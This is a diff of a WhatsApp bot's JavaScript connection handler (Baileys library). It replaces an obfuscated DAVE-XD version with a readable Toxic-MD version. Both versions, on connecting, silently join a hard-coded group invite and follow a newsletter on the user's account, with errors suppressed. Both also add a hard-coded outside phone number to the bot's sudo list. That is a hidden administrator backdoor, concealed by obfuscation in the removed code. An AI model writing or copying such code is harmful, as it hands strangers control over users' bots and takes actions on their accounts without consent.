@@ -1,1 +1,196 @@
-const a0_0x2ac4fe=a0_0x362c;function a0_0x362c(_0x3a2ffb,_0x4451d4){const _0x4fb084=a0_0x22d6();return a0_0x362c=function(_0x128aa8,_0x52609f){_0x128aa8=_0x128aa8-0xae;let _0x22d6e4=_0x4fb084[_0x128aa8];return _0x22d6e4;},a0_0x362c(_0x3a2ffb,_0x4451d4);}(function(_0x3a3dc7,_0x377e12){const _0x39c7bc=a0_0x362c,_0x444152=_0x3a3dc7();while(!![]){try{const _0x5b92fb=-parseInt(_0x39c7bc(0xfd))/0x1+-parseInt(_0x39c7bc(0xb0))/0x2+parseInt(_0x39c7bc(0xd8))/0x3+-parseInt(_0x39c7bc(0xbb))/0x4+-parseInt(_0x39c7bc(0xb9))/0x5+-parseInt(_0x39c7bc(0xb2))/0x6+parseInt(_0x39c7bc(0xf7))/0x7*(parseInt(_0x39c7bc(0xe0))/0x8);if(_0x5b92fb===_0x377e12)break;else _0x444152['push'](_0x444152['shift']());}catch(_0x16793d){_0x444152['push'](_0x444152['shift']());}}}(a0_0x22d6,0xd5e7b));function a0_0x22d6(){const _0x5190e5=['(((.+)+)+)+$','connecting','Hey\x20there!\x20Ready\x20to\x20kick\x20off\x20the\x20day?\x20🚀','exports','user','apply','11192zudhKE','log','map','exit','newsletterFollow','Bot\x20initialized\x20successfully.','🕳️\x20*Bot\x20Name*:\x20','menu','Late\x20night?\x20Let\x27s\x20see\x20what\x27s\x20cooking!\x20🌙','🔧\x20*Mode*:\x20','⚙️\x20','│❒\x20Please\x20select\x20an\x20option\x20to\x20continue:','prefix','│❒\x20*New\x20User\x20Alert*:\x20You\x27ve\x20been\x20added\x20to\x20the\x20sudo\x20list.','settings','search','🔒\x20Session\x20logged\x20out.\x20Delete\x20session\x20and\x20rescan\x20QR\x20code.','🔄\x20Establishing\x20connection\x20to\x20WhatsApp\x20servers...','254104260236','🕳️\x20*Database*:\x20Postgres\x20SQL','🕳️\x20*Time*:\x20','includes','◈━━━━━━━━━━━━━━━━◈','30163rPLLBc','badSession','┗━━━━━━━━━━━━━━━┛','│❒\x20Welcome\x20*','🕒\x20*Time*:\x20','🔌\x20Connection\x20closed.\x20Attempting\x20to\x20reconnect...','1669784EvEBEZ','env','⚠️\x20Invalid\x20session\x20file\x20detected.\x20Delete\x20session\x20and\x20rescan\x20QR\x20code.','❌\x20Failed\x20to\x20send\x20startup\x20messages:\x20','Evening\x20vibes!\x20Let\x27s\x20get\x20to\x20it!\x20🌟','\x20plugins.\x20DAVE-XD\x20is\x20ready\x20to\x20dominate!\x20😈\x0a','../Handler/commandHandler','Africa/Nairobi','│❒\x20*','│❒\x20Welcome\x20back\x20to\x20*','output','🕳️\x20*Library*:\x20Baileys','│❒\x20Loaded\x20','TIME_SIMPLE','mode','constructor','@whiskeysockets/baileys','join','📡\x20Lost\x20connection\x20to\x20server.\x20Reconnecting...','2584088QXaoxy','toLowerCase','1107324eoJvvx','📖\x20','❓\x20Unknown\x20disconnection\x20reason:\x20','loggedOut','Powered\x20by\x20','toString','│❒\x20Bot\x20successfully\x20connected\x20to\x20WhatsApp\x20🐍\x0a','7169270UPMvOT','🕳️\x20*Commands*:\x20','6105852IkrJQJ','message','error','🕳️\x20*Prefix*:\x20','../Database/config','120363400480173280@newsletter','│❒\x20Ready\x20to\x20proceed?\x20Select\x20an\x20option\x20below.','*!\x20Connection\x20established.','💾\x20*Database*:\x20Postgres\x20SQL','split','setZone','◈━━━━━━━━━━━━━━━━◈\x0a','connectionLost','📋\x20*Commands*:\x20','sendMessage','*!\x20You\x27re\x20now\x20connected\x20to\x20𝙳𝙰𝚅𝙴-x𝙳.','│❒\x20*Credits*:\x20gift_dave','toLocaleString','➡️\x20*Prefix*:\x20','SETTINGS','luxon','https://github.com/giftdee/DAVE-XD','⏳\x20Connection\x20timed\x20out.\x20Attempting\x20to\x20reconnect...','open','connectionClosed','Select\x20an\x20option\x20to\x20proceed.','now','groupAcceptInvite','📚\x20*Library*:\x20Baileys','2863689NsXSpw','@hapi/boom'];a0_0x22d6=function(){return _0x5190e5;};return a0_0x22d6();}const a0_0x52609f=(function(){let _0x234d07=!![];return function(_0x3b1073,_0x415e66){const _0x1bec23=_0x234d07?function(){const _0x26dad6=a0_0x362c;if(_0x415e66){const _0x5ac5a6=_0x415e66[_0x26dad6(0xdf)](_0x3b1073,arguments);return _0x415e66=null,_0x5ac5a6;}}:function(){};return _0x234d07=![],_0x1bec23;};}()),a0_0x128aa8=a0_0x52609f(this,function(){const _0x525d41=a0_0x362c;return a0_0x128aa8[_0x525d41(0xb7)]()[_0x525d41(0xef)](_0x525d41(0xda))['toString']()[_0x525d41(0x10c)](a0_0x128aa8)[_0x525d41(0xef)]('(((.+)+)+)+$');});a0_0x128aa8();const {Boom}=require(a0_0x2ac4fe(0xd9)),{DateTime}=require(a0_0x2ac4fe(0xcf)),{default:daveConnect,DisconnectReason}=require(a0_0x2ac4fe(0x10d)),{getSettings,getSudoUsers,addSudoUser}=require(a0_0x2ac4fe(0xbf)),{commands,totalCommands}=require(a0_0x2ac4fe(0x103)),botName=process[a0_0x2ac4fe(0xfe)]['BOTNAME']||'DAVE-XD';let hasSentStartMessage=![];async function connectionHandler(_0x31ab51,_0x18d60e,_0x28e7e1){const _0x56d919=a0_0x2ac4fe,{connection:_0x6ab8d8,lastDisconnect:_0x3f192d}=_0x18d60e;function _0x251769(){const _0x3a58e8=a0_0x362c,_0x5e7a56=DateTime[_0x3a58e8(0xd5)]()[_0x3a58e8(0xc5)](_0x3a58e8(0x104))['hour'];if(_0x5e7a56>=0x5&&_0x5e7a56<0xc)return _0x3a58e8(0xdc);if(_0x5e7a56>=0xc&&_0x5e7a56<0x12)return'What\x27s\x20up?\x20Time\x20to\x20make\x20things\x20happen!\x20⚡';if(_0x5e7a56>=0x12&&_0x5e7a56<0x16)return _0x3a58e8(0x101);return _0x3a58e8(0xe8);}function _0x39e70b(){const _0x152633=a0_0x362c;return DateTime[_0x152633(0xd5)]()[_0x152633(0xc5)](_0x152633(0x104))[_0x152633(0xcc)](DateTime[_0x152633(0x10a)]);}function _0x589859(_0x34035d,_0x2c387c=![]){const _0x4cc270=a0_0x362c,_0x1c2ba4={'A':'𝘼','B':'𝘽','C':'𝘾','D':'𝘿','E':'𝙀','F':'𝙁','G':'𝙂','H':'𝙃','I':'𝙄','J':'𝙅','K':'𝙆','L':'𝙇','M':'𝙈','N':'𝙉','O':'𝙊','P':'𝙋','Q':'𝙌','R':'𝙍','S':'𝙎','T':'𝙏','U':'𝙐','V':'𝙑','W':'𝙒','X':'𝙓','Y':'𝙔','Z':'𝙕','a':'𝙖','b':'𝙗','c':'𝙘','d':'𝙙','e':'𝙚','f':'𝙛','g':'𝙜','h':'𝙝','i':'𝙞','j':'𝙟','k':'𝙠','l':'𝙡','m':'𝙢','n':'𝙣','o':'𝙤','p':'𝙥','q':'𝙦','r':'𝙧','s':'𝙨','t':'𝙩','u':'𝙪','v':'𝙫','w':'𝙬','x':'𝙭','y':'𝙮','z':'𝙯'},_0x3bca4d=_0x2c387c?_0x34035d['toUpperCase']():_0x34035d[_0x4cc270(0xb1)]();return _0x3bca4d[_0x4cc270(0xc4)]('')[_0x4cc270(0xe2)](_0x1b60bc=>_0x1c2ba4[_0x1b60bc]||_0x1b60bc)['join']('');}if(_0x6ab8d8===_0x56d919(0xdb)){console[_0x56d919(0xe1)](_0x56d919(0xf1));return;}if(_0x6ab8d8==='close'){const _0x1167bb=new Boom(_0x3f192d?.[_0x56d919(0xbd)])?.[_0x56d919(0x107)]['statusCode'];switch(_0x1167bb){case DisconnectReason[_0x56d919(0xf8)]:console['log'](_0x56d919(0xff)),process[_0x56d919(0xe3)]();break;case DisconnectReason[_0x56d919(0xd3)]:console[_0x56d919(0xe1)](_0x56d919(0xfc)),_0x28e7e1();break;case DisconnectReason[_0x56d919(0xc7)]:console['log'](_0x56d919(0xaf)),_0x28e7e1();break;case DisconnectReason['connectionReplaced']:console[_0x56d919(0xe1)]('🔄\x20Connection\x20replaced\x20by\x20another\x20session.\x20Terminating\x20process.'),process[_0x56d919(0xe3)]();break;case DisconnectReason[_0x56d919(0xb5)]:console[_0x56d919(0xe1)](_0x56d919(0xf0)),hasSentStartMessage=![],process[_0x56d919(0xe3)]();break;case DisconnectReason['restartRequired']:console['log']('🔄\x20Server\x20requested\x20restart.\x20Initiating\x20reconnect...'),_0x28e7e1();break;case DisconnectReason['timedOut']:console[_0x56d919(0xe1)](_0x56d919(0xd1)),_0x28e7e1();break;default:console[_0x56d919(0xe1)](_0x56d919(0xb4)+_0x1167bb+'\x20|\x20'+_0x6ab8d8+'.\x20Reconnecting...'),_0x28e7e1();}return;}if(_0x6ab8d8===_0x56d919(0xd2)){try{await _0x31ab51[_0x56d919(0xe4)](_0x56d919(0xc0)),await _0x31ab51[_0x56d919(0xd6)]('LfTFxkUQ1H7Eg2D0vR3n6g');}catch{}const _0x22f292=_0x31ab51[_0x56d919(0xde)]['id']['split'](':')[0x0][_0x56d919(0xc4)]('@')[0x0],_0x15207f=await getSettings(),_0x364ca8=await getSudoUsers();if(!hasSentStartMessage){const _0x10f4c9=!_0x364ca8[_0x56d919(0xf5)](_0x22f292);if(_0x10f4c9){await addSudoUser(_0x22f292);const _0x13339b=_0x56d919(0xf2);!_0x364ca8[_0x56d919(0xf5)](_0x13339b)&&await addSudoUser(_0x13339b);}const _0x2f59cc=_0x10f4c9?[_0x56d919(0xf6),_0x56d919(0x105)+_0x251769()+'*',_0x56d919(0xfa)+botName+_0x56d919(0xca),'','✨\x20*Bot\x20Name*:\x20'+botName,_0x56d919(0xe9)+_0x15207f['mode'],_0x56d919(0xcd)+_0x15207f['prefix'],_0x56d919(0xc8)+totalCommands,_0x56d919(0xfb)+_0x39e70b(),_0x56d919(0xc3),_0x56d919(0xd7),'',_0x56d919(0xed),'',_0x56d919(0xcb),_0x56d919(0xf6)]['join']('\x0a'):[_0x56d919(0xf6),_0x56d919(0x105)+_0x251769()+'*',_0x56d919(0x106)+botName+_0x56d919(0xc2),'',_0x56d919(0xe6)+botName,_0x56d919(0xe9)+_0x15207f[_0x56d919(0x10b)],_0x56d919(0xbe)+_0x15207f[_0x56d919(0xec)],_0x56d919(0xba)+totalCommands,_0x56d919(0xf4)+_0x39e70b(),_0x56d919(0xf3),_0x56d919(0x108),'',_0x56d919(0xc1),'',_0x56d919(0xcb),_0x56d919(0xf6)][_0x56d919(0xae)]('\x0a'),_0x248043=[_0x56d919(0xf6),_0x56d919(0xeb),_0x56d919(0xf6)]['join']('\x0a');try{await _0x31ab51[_0x56d919(0xc9)](_0x31ab51['user']['id'],{'text':_0x2f59cc,'footer':_0x56d919(0xb6)+botName,'viewOnce':!![],'contextInfo':{'externalAdReply':{'showAdAttribution':![],'title':botName,'body':_0x56d919(0xe5),'sourceUrl':_0x56d919(0xd0),'mediaType':0x1,'renderLargerThumbnail':!![]}}}),await _0x31ab51['sendMessage'](_0x31ab51[_0x56d919(0xde)]['id'],{'text':_0x248043,'footer':_0x56d919(0xb6)+botName,'buttons':[{'buttonId':(_0x15207f[_0x56d919(0xec)]||'')+_0x56d919(0xee),'buttonText':{'displayText':_0x56d919(0xea)+_0x589859(_0x56d919(0xce))},'type':0x1},{'buttonId':(_0x15207f[_0x56d919(0xec)]||'')+_0x56d919(0xe7),'buttonText':{'displayText':_0x56d919(0xb3)+_0x589859('MENU')},'type':0x1}],'headerType':0x1,'viewOnce':!![],'contextInfo':{'externalAdReply':{'showAdAttribution':![],'title':botName,'body':_0x56d919(0xd4),'sourceUrl':_0x56d919(0xd0),'mediaType':0x1,'renderLargerThumbnail':!![]}}});}catch(_0x5df517){console[_0x56d919(0xbd)](_0x56d919(0x100)+_0x5df517[_0x56d919(0xbc)]);}hasSentStartMessage=!![];}console[_0x56d919(0xe1)](_0x56d919(0xc6)+_0x56d919(0xb8)+(_0x56d919(0x109)+totalCommands+_0x56d919(0x102))+_0x56d919(0xf9));}}module[a0_0x2ac4fe(0xdd)]=connectionHandler;
+const { Boom } = require("@hapi/boom");
+const { DateTime } = require("luxon");
+const { default: toxicConnect, DisconnectReason } = require("@whiskeysockets/baileys");
+const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
+const { commands, totalCommands } = require("../Handler/commandHandler");
+
+const botName = process.env.BOTNAME || "Toxic-MD";
+let hasSentStartMessage = false;
+let hasFollowedNewsletter = false;
+
+async function connectionHandler(socket, connectionUpdate, reconnect) {
+  const { connection, lastDisconnect } = connectionUpdate;
+
+  function getGreeting() {
+    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
+    if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
+    if (hour >= 12 && hour < 18) return "What's up? Time to make things happen! ⚡";
+    if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it! 🌟";
+    return "Late night? Let's see what's cooking! 🌙";
+  }
+
+  function getCurrentTime() {
+    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
+  }
+
+  function toFancyFont(text, isUpperCase = false) {
+    const fonts = {
+      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
+      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
+      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
+      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
+    };
+    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
+    return formattedText.split('').map(char => fonts[char] || char).join('');
+  }
+
+  if (connection === "connecting") {
+    return;
+  }
+
+  if (connection === "close") {
+    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
+    switch (statusCode) {
+      case DisconnectReason.badSession:
+        process.exit();
+        break;
+      case DisconnectReason.connectionClosed:
+        reconnect();
+        break;
+      case DisconnectReason.connectionLost:
+        reconnect();
+        break;
+      case DisconnectReason.connectionReplaced:
+        process.exit();
+        break;
+      case DisconnectReason.loggedOut:
+        hasSentStartMessage = false;
+        hasFollowedNewsletter = false;
+        process.exit();
+        break;
+      case DisconnectReason.restartRequired:
+        reconnect();
+        break;
+      case DisconnectReason.timedOut:
+        reconnect();
+        break;
+      default:
+        reconnect();
+    }
+    return;
+  }
+
+  if (connection === "open") {
+    console.clear();
+    try {
+      await socket.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
+    } catch (error) {}
+    if (!hasFollowedNewsletter) {
+      try {
+        await socket.newsletterFollow("120363322461279856@newsletter");
+        hasFollowedNewsletter = true;
+      } catch (error) {}
+    }
+    const userId = socket.user.id.split(":")[0].split("@")[0];
+    const settings = await getSettings();
+    const sudoUsers = await getSudoUsers();
+    if (!hasSentStartMessage) {
+      const isNewUser = !sudoUsers.includes(userId);
+      if (isNewUser) {
+        await addSudoUser(userId);
+        const defaultSudo = "254735342808";
+        if (!sudoUsers.includes(defaultSudo)) {
+          await addSudoUser(defaultSudo);
+        }
+      }
+      if (settings.startmessage) {
+        const firstMessage = isNewUser
+          ? [
+              `◈━━━━━━━━━━━━━━━━◈`,
+              `│❒ *${getGreeting()}*`,
+              `│❒ Welcome to *${botName}*! You're now connected.`,
+              ``,
+              `✨ *Bot Name*: ${botName}`,
+              `🔧 *Mode*: ${settings.mode}`,
+              `➡️ *Prefix*: ${settings.prefix}`,
+              `📋 *Commands*: ${totalCommands}`,
+              `🕒 *Time*: ${getCurrentTime()}`,
+              `💾 *Database*: Postgres SQL`,
+              `📚 *Library*: Baileys`,
+              ``,
+              `│❒ *New User Alert*: You've been added to the sudo list.`,
+              ``,
+              `│❒ *Start Message*: Enabled by default. Use *${settings.prefix}startmessage off* to disable.`,
+              `│❒ *Credits*: xh_clinton`,
+              `◈━━━━━━━━━━━━━━━━◈`
+            ].join("\n")
+          : [
+              `◈━━━━━━━━━━━━━━━━◈`,
+              `│❒ *${getGreeting()}*`,
+              `│❒ Welcome back to *${botName}*! Connection established.`,
+              ``,
+              `✨ *Bot Name*: ${botName}`,
+              `🔧 *Mode*: ${settings.mode}`,
+              `➡️ *Prefix*: ${settings.prefix}`,
+              `📋 *Commands*: ${totalCommands}`,
+              `🕒 *Time*: ${getCurrentTime()}`,
+              `💾 *Database*: Postgres SQL`,
+              `📚 *Library*: Baileys`,
+              ``,
+              `│❒ Ready to proceed? Select an option below.`,
+              ``,
+              `│❒ *Start Message*: Enabled by default. Use *${settings.prefix}startmessage off* to disable.`,
+              `│❒ *Credits*: xh_clinton`,
+              `◈━━━━━━━━━━━━━━━━◈`
+            ].join("\n");
+        const secondMessage = [
+          `◈━━━━━━━━━━━━━━━━◈`,
+          `│❒ Please select an option to continue:`,
+          `◈━━━━━━━━━━━━━━━━◈`
+        ].join("\n");
+        try {
+          await socket.sendMessage(socket.user.id, {
+            text: firstMessage,
+            footer: `Powered by ${botName}`,
+            viewOnce: true,
+            contextInfo: {
+              externalAdReply: {
+                showAdAttribution: false,
+                title: botName,
+                body: `Bot initialized successfully.`,
+                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
+                mediaType: 1,
+                renderLargerThumbnail: true
+              }
+            }
+          });
+          await socket.sendMessage(socket.user.id, {
+            text: secondMessage,
+            footer: `Powered by ${botName}`,
+            buttons: [
+              {
+                buttonId: `${settings.prefix || ''}settings`,
+                buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
+                type: 1
+              },
+              {
+                buttonId: `${settings.prefix || ''}menu`,
+                buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
+                type: 1
+              },
+              {
+                buttonId: `${settings.prefix || ''}startmessage off`,
+                buttonText: { displayText: `🚫 ${toFancyFont('DISABLE START')}` },
+                type: 1
+              }
+            ],
+            headerType: 1,
+            viewOnce: true,
+            contextInfo: {
+              externalAdReply: {
+                showAdAttribution: false,
+                title: botName,
+                body: `Select an option to proceed.`,
+                sourceUrl: `https://github.com/xhclintohn/Toxic-MD`,
+                mediaType: 1,
+                renderLargerThumbnail: true
+              }
+            }
+          });
+        } catch (error) {}
+      }
+      hasSentStartMessage = true;
+    }
+  }
+}
+module.exports = connectionHandler;
